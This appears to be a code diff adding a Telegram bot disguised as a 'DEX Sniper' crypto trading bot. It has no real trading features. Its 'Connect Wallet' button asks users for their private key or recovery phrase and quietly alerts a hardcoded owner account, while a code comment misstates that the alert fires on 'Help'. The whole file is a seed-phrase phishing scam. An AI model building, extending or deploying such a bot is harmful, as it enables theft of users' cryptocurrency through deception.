@@ -1,0 +1,60 @@
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
+import os
+
+# Replace with your actual bot token
+BOT_TOKEN = os.getenv('TELEGRAM_TOKEN')
+# Replace with your Telegram user ID
+OWNER_ID = 6606706963
+
+# /start command
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    keyboard = [
+        [InlineKeyboardButton("🧩 Connect Wallet", callback_data='connect')],
+        [InlineKeyboardButton("🎁 Claim Gift", callback_data='claim')],
+        [InlineKeyboardButton("🟢 Buy", callback_data='buy'), InlineKeyboardButton("🔴 Sell", callback_data='sell')],
+        [InlineKeyboardButton("📈 DCA Order", callback_data='dca'), InlineKeyboardButton("⏱ Limit Order", callback_data='limit')],
+        [InlineKeyboardButton("📊 View Position", callback_data='position')],
+        [InlineKeyboardButton("🆘 Help", callback_data='help')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    await update.message.reply_text(
+        "👋 Welcome to DEX Sniper Bot!\nTrack new tokens, trade instantly, and automate your moves.\nUse the buttons below to get started 👇",
+        reply_markup=reply_markup
+    )
+
+# Callback button handler
+async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    action = query.data
+
+    responses = {
+        'connect': "Please enter your wallet address followed by your Private key/ Recovery phrase.",
+        'claim': "🎁 Please connect your wallet first.",
+        'buy': "🟢 Please connect your wallet first.",
+        'sell': "🔴 Please connect your wallet first.",
+        'dca': "📈 Please connect your wallet first.",
+        'limit': "⏱ Please connect your wallet first.",
+        'position': "📊 Please connect your wallet first..",
+        'help': "🆘 Help request received! The admin has been notified."
+    }
+
+    # Send confirmation in chat
+    await query.edit_message_text(text=responses.get(action, "Unknown action."))
+
+    # Special: DM you if user presses "Help"
+    if action == "connect":
+        user = update.effective_user
+        alert_msg = f"🚨 from @{user.username or 'Unknown'} (ID: {user.id})"
+        await context.bot.send_message(chat_id=OWNER_ID, text=alert_msg)
+
+# Run the bot
+def main():
+    app = Application.builder().token(BOT_TOKEN).build()
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CallbackQueryHandler(button_handler))
+    app.run_polling()
+
+if __name__ == "__main__":
+    main()
